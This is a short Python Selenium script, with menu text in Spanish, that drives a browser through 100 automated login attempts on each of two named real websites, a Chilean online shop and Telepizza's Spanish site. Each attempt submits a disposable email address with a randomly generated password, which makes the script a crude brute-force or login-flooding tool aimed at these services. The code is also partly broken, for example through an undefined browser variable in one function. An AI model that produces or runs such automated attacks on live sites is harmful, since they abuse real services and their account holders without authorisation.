from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from random import choice
import time
import random
import msvcrt
import pyperclip as clipboard
import keyboard

def chileno():
    valores = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    S = "SKACPPkcehrc@yopmail.com"
    C = ""
    
    for i in range (0,100):
        C = C.join([choice(valores) for i in range(12)])
        browser.get("https://mariakawaii.cl/mi-cuenta/")
        time.sleep(3)
        
        username = browser.find_element_by_id("username")
        password = browser.find_element_by_id("password")

        username.clear()
        password.clear()

        username.send_keys(S)
        password.send_keys(C)

        login_attempt = browser.find_element_by_xpath("//*[@name='login']").click()
        time.sleep(5)
    


def europeo():
    
    valores = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    S = "stMwIgwEeQn@yopmail.com"
    C = ""
    #Iniciamos Sesion
    browser = webdriver.Chrome()

    for i in range (100):
        C = C.join([choice(valores) for i in range(4,15)])
        browser.get("https://www.telepizza.es/#home_login_form")
        time.sleep(5)

        username = browser.find_element_by_id("EmailLogin")
        username.send_keys(S)

        password = browser.find_element_by_xpath("/html/body/ul/li[1]/div/div[2]/fieldset[1]/form/div[2]/span[1]/input[2]").click()
        keyboard.write(C)
        time.sleep(3)

        boton = browser.find_element_by_xpath("/html/body/ul/li[1]/div/div[2]/fieldset[1]/form/div[4]/button").click()



print("1.- Sitio Chileno")
print("2.- Sitio Europeo")
entrada = input("Ingrese un numero: ")

if int(entrada) == 1:
    chileno()

elif int(entrada) == 2:
    europeo()
else:
    print("Numero no valido")